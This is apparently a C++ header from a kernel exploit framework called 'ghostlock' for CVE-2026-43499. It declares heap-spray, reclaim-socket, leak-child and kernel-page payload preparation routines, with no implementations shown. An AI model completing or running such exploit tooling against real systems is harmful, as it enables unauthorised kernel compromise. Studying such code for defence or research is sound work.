#ifndef GHOSTLOCK_BACKEND_CVE_2026_43499_SPRAY_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43499_SPRAY_HPP

#include <cstddef>
#include <cstdint>
#include <sys/types.h>

#include "memory/payload_builder.h"
#include "support/status.hpp"

/* 43499 heap page preparation, KernelSnitch leak child and the spray / reclaim
 * socket bookkeeping. These declarations moved here from support/decls.hpp when
 * the implementations moved into spray.cpp (F15 ownership move): they all read
 * the 43499 session state, its profile or the route policy, so support is not
 * their layer. spray.cpp is the single TU that includes the frozen
 * kernelsnitch.h provider, whose context_* entry points are not inline. */
namespace ghostlock::backend::cve_2026_43499::spray {
    /* Startup diagnostics of the bound 43499 session (slide/profile/state). */
    void log_startup_context(void);

    void init_p0_profile(void);

    /* Forked leak child running kernelsnitch::context_find_collisions. */
    pid_t clone_leak_child(void);

    /* Reclaim-socket and prebuilt page ownership kept by the heap state. */
    void close_reclaim_sockets(void);

    int32_t quarantine_reclaim_sockets(void);

    void release_quarantined_reclaim_sockets(void);

    Status stash_prebuilt_page(void);

    Status activate_prebuilt_page(void);

    void discard_prebuilt_page(void);

    void cleanup_page_prepare_state(void);

    void prepare_ctxs(void);

    int32_t prepare_skb_payload(uintptr_t base,
                                const ghostlock::memory::WriteRequest *request);

    uintptr_t prepare_kernel_page(const ghostlock::memory::WriteRequest *request);

    uintptr_t prepare_good_kernel_page(const ghostlock::memory::WriteRequest &request);
} // namespace ghostlock::backend::cve_2026_43499::spray

#endif
